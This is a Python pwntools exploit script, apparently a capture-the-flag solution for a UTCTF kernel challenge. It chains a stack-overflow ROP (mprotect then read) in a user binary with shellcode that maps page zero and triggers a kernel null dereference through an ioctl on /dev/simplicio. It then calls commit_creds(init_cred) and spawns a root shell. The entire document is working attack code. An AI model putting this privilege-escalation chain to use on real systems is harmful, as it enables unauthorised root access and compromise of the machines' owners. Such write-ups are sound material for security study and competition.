from pwn import *
context.arch = 'amd64'
c = constants

POP_RAX = 0x44eea0
POP_RDI = 0x4017da
POP_RSI = 0x40788e
POP_RDX_RBX = 0x48e8ab
SYSCALL = 0x41cdf4
INC_EAX = 0x482c20

STAGE2_ADDR = 0x4cc000

INIT_CRED = 0xffffffff818323c0
COMMIT_CREDS = 0xffffffff81049200

if len(sys.argv) == 1:
    s = process('./cmd.sh', shell=True)
else:
    s = remote('kernel.utctf.live', 9051)
 
def escape(p):
    return ''.join(['\x16' + x for x in p])

# 1. pwn the main binary
# 2. read stage2
def stage1():
    s.sendlineafter('you?', '-1')
    s.sendlineafter('call?', 'A')

    rop = flat(
        # padding
        'A' * 264,

        # mprotect
        POP_RAX, c.SYS_mprotect - 1, # avoid \n
        INC_EAX,
        POP_RDI, STAGE2_ADDR,
        POP_RSI, 0x1000,
        POP_RDX_RBX, c.PROT_EXEC | c.PROT_WRITE | c.PROT_READ, 0xdeadbeef,
        SYSCALL,

        # read
        POP_RAX, c.SYS_read,
        POP_RDI, 0,
        POP_RSI, STAGE2_ADDR,
        POP_RDX_RBX, 0x1000, 0xdeadbeef,
        SYSCALL,

        # ret
        STAGE2_ADDR
    )

    s.sendlineafter('message:', escape(rop))
    s.recvuntil('to A')

# 1. mmap a page at 0x0
# 2. read stage3
# 3. send an invalid ioctl request, which triggers null dereference in kernel space
# 4. exec /bin/sh
def stage2():
    p = shellcraft.syscall(
       'SYS_mmap', 
        0,
        0x1000,
        c.PROT_READ | c.PROT_WRITE | c.PROT_EXEC,
        c.MAP_PRIVATE | c.MAP_ANONYMOUS | c.MAP_FIXED,
       -1, 0
    )

    p += shellcraft.read(0, 0, 0x100)
    p += shellcraft.open('/dev/simplicio')
    p += shellcraft.ioctl(3, 0x1337, INIT_CRED)
    p += shellcraft.sh()

    s.sendline(escape(asm(p)))
    s.recv()

# commit_creds(init_cred)
def stage3():
    p = '''
        mov rax, {}
        call rax
        ret
    '''.format(COMMIT_CREDS)

    s.sendline(escape(asm(p)))
    s.recv()

stage1()
stage2()
stage3()

s.recvline()
s.interactive()
